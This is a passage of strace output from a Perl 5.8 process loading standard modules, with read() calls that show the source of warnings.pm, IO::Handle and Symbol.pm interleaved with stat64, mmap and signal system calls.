[34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
6989  07:16:29.063925 brk(0x81b6000)    = 0x81b6000
6989  07:16:29.063943 brk(0x81b5000)    = 0x81b5000
6989  07:16:29.064033 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
6989  07:16:29.064463 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
6989  07:16:29.065223 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
6989  07:16:29.065357 read(8, "", 4096) = 0
6989  07:16:29.065371 close(8)          = 0
6989  07:16:29.065537 _llseek(6, 412, [412], SEEK_SET) = 0
6989  07:16:29.065553 _llseek(6, 0, [412], SEEK_CUR) = 0
6989  07:16:29.065564 close(6)          = 0
6989  07:16:29.065607 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6989  07:16:29.065631 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6989  07:16:29.065660 futex(0xb7f57070, 0x81 /* FUTEX_??? */, 2147483647) = 0
6989  07:16:29.065677 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
6989  07:16:29.065691 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6989  07:16:29.065784 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6989  07:16:29.065810 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f5b000
6989  07:16:29.065824 mmap2(0xb7f5f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f5f000
6989  07:16:29.065839 close(6)          = 0
6989  07:16:29.065968 stat64("/etc/perl/IO/Handle.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.065985 stat64("/etc/perl/IO/Handle.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066087 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066101 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066115 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066128 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066142 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066154 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066167 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066180 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066193 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066206 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
6989  07:16:29.066227 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.066242 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.066254 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.066271 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
6987  07:16:29.066635 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6987  07:16:29.066659 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6987  07:16:29.066674 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6987  07:16:29.066685 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6987  07:16:29.066697 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6987  07:16:29.066712 waitpid(-1,  <unfinished ...>
6989  07:16:29.066788 stat64("/etc/perl/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066804 stat64("/etc/perl/Symbol.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066818 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066831 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066845 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066858 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066876 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066888 stat64("/usr/lib/perl5/Symbol.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066901 stat64("/usr/share/perl5/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066913 stat64("/usr/share/perl5/Symbol.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066927 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066939 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066953 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.066966 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
6989  07:16:29.066987 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.067002 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.067014 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.067032 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ 